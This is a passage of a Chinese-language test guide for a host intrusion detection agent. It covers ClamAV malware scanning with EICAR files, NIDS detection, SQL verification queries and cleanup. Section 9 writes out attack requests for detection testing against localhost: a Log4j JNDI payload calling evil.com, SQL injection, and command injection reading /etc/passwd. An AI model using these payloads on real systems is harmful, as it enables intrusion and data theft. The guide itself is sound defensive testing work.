- `status` 字段为数字：0=未通过，1=通过，2=检查异常

---

## 八、Scanner 插件测试

Scanner 插件使用 ClamAV 引擎扫描文件系统，检测木马、Webshell、挖矿程序等恶意文件。检测结果写入 `alert_malware_scan` 表。

> 前提：ClamAV 开发库已安装（`apt install clamav libclamav-dev clamav-freshclam`），病毒库文件位于 `/var/lib/clamav/`（执行 `sudo freshclam` 下载）。

### 8.1 准备测试文件

Agent 连接后，hcids 会自动下发目录扫描任务（扫描 `/root`、`/etc`、`/var/www`）。在启动 Agent **之前**，先创建 EICAR 标准测试文件：

```bash
# 在自动扫描目录下创建 EICAR 测试文件
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /root/eicar_test.com
```

启动 Agent 后，约 5 秒后 hcids 自动下发扫描任务，Scanner 插件会扫描 `/root` 目录并检出该文件。

### 8.2 数据库验证

等待扫描完成后（约 30 秒）查询：

**恶意文件检测记录 (alert_malware_scan)：**

```sql
SELECT agent_id, host_ip, threat_type, file_name, file_path, file_size,
       file_md5, detection_engine, malware_family, scan_time, created_at
FROM alert_malware_scan
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 10;
```

验证要点：
- `file_path` 为 `/root/eicar_test.com`
- `file_md5` 为 `44d88612fea8a8f36de82e1278abb02f`（EICAR 标准 MD5）
- `detection_engine` 为 `ClamAV`
- `threat_type` 非空

### 8.3 多文件批量检测

```bash
# 创建多个测试文件（在自动扫描目录下）
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /root/eicar_1.exe
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /root/eicar_2.sh
```

重启 Agent 触发自动扫描后查询：

```sql
-- 验证检测数量
SELECT COUNT(*) FROM alert_malware_scan
WHERE agent_id = '123456' AND file_path LIKE '/root/eicar%';
```

验证要点：检测记录数 >= 3（eicar_test.com + eicar_1.exe + eicar_2.sh）

### 8.4 清理测试文件

```bash
rm -f /root/eicar_test.com /root/eicar_1.exe /root/eicar_2.sh
```

---

## 九、NIDS 插件测试

NIDS 插件通过 gopacket 抓取网卡流量，解析 HTTP 请求后与 Suricata 格式规则匹配，检测结果写入 `alert_network_attack` 表。

> 前提：libpcap 已安装，Nginx 运行在 127.0.0.1:80，nids 配置抓取 lo 接口。

### 9.1 触发网络攻击检测

在另一个终端执行攻击模拟请求：

```bash
# 终端 C：Log4j2 JNDI 注入（SID 1001, critical）
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/

# SQL 注入 UNION SELECT（SID 2001, high）
curl -s -o /dev/null 'http://127.0.0.1/api?id=1%20UNION%20SELECT%201,2,3'

# 命令注入（SID 3001, critical）
curl -s -o /dev/null 'http://127.0.0.1/api?cmd=%3bcat%20/etc/passwd'

# SQLMap 扫描器 UA（SID 6001, medium）
curl -s -o /dev/null -A 'sqlmap/1.0' http://127.0.0.1/
```

### 9.2 数据库验证

等待 5-10 秒后查询：

**网络攻击告警 (alert_network_attack)：**

```sql
SELECT agent_id, host_ip, attacker_ip, target_port, vulnerability_name,
       attack_count, attack_payload, first_attack_time, last_attack_time, created_at
FROM alert_network_attack
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 10;
```

验证要点：
- 至少有 4 条记录（对应上述 4 条 curl 请求）
- `attacker_ip` 为 `127.0.0.1`
- `target_port` 为 `80`
- `vulnerability_name` 包含对应的规则描述（如 `Log4j2`、`SQL Injection` 等）

### 9.3 重复攻击计数验证

```bash
# 终端 C：连续发送 3 次相同攻击
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
```

```sql
SELECT vulnerability_name, attack_count, first_attack_time, last_attack_time
FROM alert_network_attack
WHERE agent_id = '123456' AND vulnerability_name LIKE '%Log4j2%'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：`attack_count` 随重复攻击递增

---

## 十、完整验证脚本

以下脚本一次性验证所有关键表的数据写入情况（含 scanner 和 nids），可在数据库终端或脚本中执行：

```sql
-- ========== Agent 连接状态 ==========
SELECT '=== agent_info ===' AS section;
SELECT agent_id, host_name, host_ip, connection_status, agent_version,
       last_connected_at
FROM agent_info WHERE agent_id = '123456';

-- ========== Collector 资产数据 ==========
SELECT '=== Asset Summary ===' AS section;
SELECT
    (SELECT COUNT(*) FROM asset_process WHERE agent_id = '123456') AS process_count,
    (SELECT COUNT(*) FROM asset_port WHERE agent_id = '123456') AS port_count,
    (SELECT COUNT(*) FROM asset_account WHERE agent_id = '123456') AS account_count,
    (SELECT COUNT(*) FROM asset_system_service WHERE agent_id = '123456') AS service_count,
    (SELECT COUNT(*) FROM asset_software WHERE agent_id = '123456') AS software_count,
    (SELECT COUNT(*) FROM asset_kmod WHERE agent_id = '123456') AS kmod_count,
    (SELECT COUNT(*) FROM asset_container WHERE agent_id = '123456') AS container_count,
    (SELECT COUNT(*) FROM asset_image WHERE agent_id = '123456') AS image_count,
    (SELECT COUNT(*) FROM asset_web_service WHERE agent_id = '123456') AS web_service_count;

-- ========== eBPF 事件数据（默认不持久化，预期为 0）==========
SELECT '=== Event Summary (expect 0 - raw events not persisted by default) ===' AS section;
SELECT
    (SELECT COUNT(*) FROM event_execve WHERE agent_id = '123456') AS execve_count,
    (SELECT COUNT(*) FROM event_connect WHERE agent_id = '123456') AS connect_count,
    (SELECT COUNT(*) FROM event_dns WHERE agent_id = '123456') AS dns_count,
    (SELECT COUNT(*) FROM event_file WHERE agent_id = '123456') AS file_count;

-- ========== 告警数据 ==========
SELECT '=== Alert Summary ===' AS section;
SELECT
    (SELECT COUNT(*) FROM alert_brute_force WHERE agent_id = '123456') AS brute_force_count,
    (SELECT COUNT(*) FROM alert_dangerous_command WHERE agent_id = '123456') AS dangerous_cmd_count,
    (SELECT COUNT(*) FROM alert_privilege_escalation WHERE agent_id = '123456') AS privesc_count,
    (SELECT COUNT(*) FROM alert_reverse_shell WHERE agent_id = '123456') AS reverse_shell_count,
    (SELECT COUNT(*) FROM alert_abnormal_login WHERE agent_id = '123456') AS abnormal_login_count,
    (SELECT COUNT(*) FROM alert_malicious_request WHERE agent_id = '123456') AS malicious_request_count,
    (SELECT COUNT(*) FROM alert_file_integrity WHERE agent_id = '123456') AS file_integrity_count,
    (SELECT COUNT(*) FROM alert_malware_scan WHERE agent_id = '123456') AS malware_scan_count,
    (SELECT COUNT(*) FROM alert_network_attack WHERE agent_id = '123456') AS network_attack_count;

-- ========== Baseline 数据 ==========
SELECT '=== Baseline Summary ===' AS section;
SELECT
    (SELECT COUNT(*) FROM baseline_check_result WHERE agent_id = '123456') AS result_count,
    (SELECT COUNT(*) FROM baseline_check_detail WHERE agent_id = '123456') AS detail_count;
```

### 预期结果

**Agent 状态：**

| 数据类别 | 预期 | 说明 |
|---------|------|------|
| agent_info | 1 条，connection_status=1 | Agent 在线 |

**Collector 资产数据：**

| 数据类别 | 预期 | 说明 |
|---------|------|------|
| asset_process | > 50 条 | 系统进程数 |
| asset_port | > 0 条 | 监听端口数 |
| asset_account | > 0 条 | 系统用户数 |
| asset_system_service | > 0 条 | systemd 服务数 |
| asset_software | > 0 条 | 安装软件包数 |
| asset_kmod | > 0 条 | 内核模块数 |
| asset_container | > 0 条 | 需先启动容器（参见 4.1） |
| asset_image | > 0 条 | 需要有容器镜像 |
| asset_image_package | > 0 条 | 需先启动容器（参见 4.1） |
| asset_web_service | > 0 条 | 需先启动 Nginx 或 httpd（参见 4.1） |

**告警数据：**

| 数据类别 | 预期 | 触发条件 |
|---------|------|---------|
| alert_dangerous_command | > 0 条 | 执行过 `rm -rf` 等高危命令后 |
| alert_privilege_escalation | > 0 条 | 触发过 SUID 提权后 |
| alert_reverse_shell | > 0 条 | 触发过反弹 Shell 后 |
| alert_malicious_request | > 0 条 | 访问过已知恶意域名后 |
| alert_file_integrity | > 0 条 | 修改过敏感路径文件后 |
| alert_brute_force | > 0 条 | 模拟过 SSH/FTP 暴力破解后 |
| alert_abnormal_login | > 0 条 | 从非白名单 IP 登录 SSH 后 |
| alert_malware_scan | > 0 条 | 执行过 EICAR 扫描后 |
| alert_network_attack | > 0 条 | 执行过攻击模拟请求后 |

**Baseline 数据：**

| 数据类别 | 预期 | 说明 |
|---------|------|------|
| baseline_check_result | > 0 条 | 手动下发基线任务后（含 baseline_id, template_id） |
| baseline_check_detail | > 0 条 | 基线检查项明细包含 template_name, template_id, risk_level） |

---

## 十一、测试后清理

### 11.1 停止服务

```bash
# 终端 B：停止 Agent（Ctrl+C）
# 终端 A：停止 hcids（Ctrl+C）
```

### 11.2 验证 Agent 离线

Agent 断开后，hcids 会更新连接状态：

```sql
SELECT agent_id, connection_status, last_connected_at
FROM agent_info WHERE agent_id = '123456';
-- connection_status 应为 0（离线）
```

### 11.3 清理测试产物

告警测试过程中会在系统上创建临时文件，测试完成后需清理，避免残留影响系统安全或下次测试结果。

```bash
# --- 提权测试产物 ---
rm -f /tmp/suid_test_id          # SUID 提权测试二进制

# --- 文件完整性测试产物 ---
rm -f /etc/cron.d/ebpf_test_cron # crontab 测试文件

# --- 恶意软件扫描测试产物 ---
rm -f /root/eicar_test.com /root/eicar_1.exe /root/eicar_2.sh  # EICAR 测试文件

# --- 容器测试产物（4.1 中启动的测试容器）---
docker rm -f test-alpine 2>/dev/null  # 删除测试容器

# --- 反弹 Shell 测试残留 ---
killall nc 2>/dev/null            # 清理 nc 监听进程

# --- DNS 测试残留（如使用了无外网方案）---
systemctl start systemd-resolved 2>/dev/null  # 恢复 DNS 服务
```

> **重要**：SUID 文件（`/tmp/suid_test_id`）和 crontab 文件（`/etc/cron.d/ebpf_test_cron`）如果残留，可能被安全扫描工具误报或被攻击者利用，务必确认已删除。

### 11.4 清理测试数据（可选）

**方式一：使用清理脚本（全量清空）**

```bash
bash scripts/clean-test-db.sh
```

**方式二：仅清理测试 Agent 数据**

```sql
-- 清理测试 Agent 的所有数据
DELETE FROM asset_process WHERE agent_id = '123456';
DELETE FROM asset_port WHERE agent_id = '123456';
DELETE FROM asset_account WHERE agent_id = '123456';
DELETE FROM asset_system_service WHERE agent_id = '123456';
DELETE FROM asset_software WHERE agent_id = '123456';
DELETE FROM asset_kmod WHERE agent_id = '123456';
DELETE FROM asset_container WHERE agent_id = '123456';
DELETE FROM asset_image WHERE agent_id = '123456';
DELETE FROM asset_image_package WHERE agent_id = '123456';
DELETE FROM asset_web_service WHERE agent_id = '123456';
DELETE FROM asset_database WHERE agent_id = '123456';
DELETE FROM asset_env_suspicious WHERE agent_id = '123456';
DELETE FROM event_execve WHERE agent_id = '123456';
DELETE FROM event_connect WHERE agent_id = '123456';
DELETE FROM event_dns WHERE agent_id = '123456';
DELETE FROM event_file WHERE agent_id = '123456';
DELETE FROM alert_brute_force WHERE agent_id = '123456';
DELETE FROM alert_dangerous_command WHERE agent_id = '123456';
DELETE FROM alert_privilege_escalation WHERE agent_id = '123456';
DELETE FROM alert_reverse_shell WHERE agent_id = '123456';
DELETE FROM alert_abnormal_login WHERE agent_id = '123456';
DELETE FROM alert_malicious_request WHERE agent_id = '123456';
DELETE FROM alert_malware_scan WHERE agent_id = '123456';
DELETE FROM alert_network_attack WHERE agent_id = '123456';
DELETE FROM alert_file_integrity WHERE agent_id = '123456';
DELETE FROM baseline_check_detail WHERE agent_id = '123456';
DELETE FROM baseline_check_result WHERE agent_id = '123456';
DELETE FROM agent_info WHERE agent_id = '123456';
```

---

## 十二、常见问题

### 12.1 Agent 连接失败

```
transport: Error while dialing: dial tcp 127.0.0.1:50051: connect: connection refused
```

**排查：**
1. 确认 hcids 已启动且监听 50051 端口：`ss -tlnp | grep 50051`
2. 确认 agent.yaml 中 `server` 地址正确
3. 检查防火墙是否放行端口

### 12.2 数据库中无数据

**排查：**
1. 确认 hcids 日志中有数据接收日志（非 error 级别）
2. 确认 hcids 数据库连接正常：检查启动日志无 `数据库初始化失败`
3. 检查 hcids 日志是否有写入错误：`写入失败` 关键字
4. 确认 Agent 已发送数据：Agent 日志中查看 transport 相关日志

### 12.3 hcids 数据库连接失败

```
数据库初始化失败: failed to connect to host=xxx
```

**排查：**
1. 确认 PostgreSQL 服务运行中
2. 确认 `server.yaml` 中数据库配置正确
3. 测试连接：`PGPASSWORD=root psql -h 127.0.0.1 -p 5432 -U postgres -d soc`

### 12.4 Collector 数据未写入

Collector 首轮采集有短暂延迟。如果等待超过 60 秒仍无数据：
1. 检查 hcids 日志中是否有 `handlePackagedData` 相关日志
2. 确认 Agent 启动时加载了 collector 插件

### 12.5 GeoIP 初始化失败

```
Failed to initialize GeoIP service
```

测试环境可在 `server.yaml` 中设置 `geoip.enabled: false`。GeoIP 仅影响告警中的 `source_location` 字段，不影响核心功能。
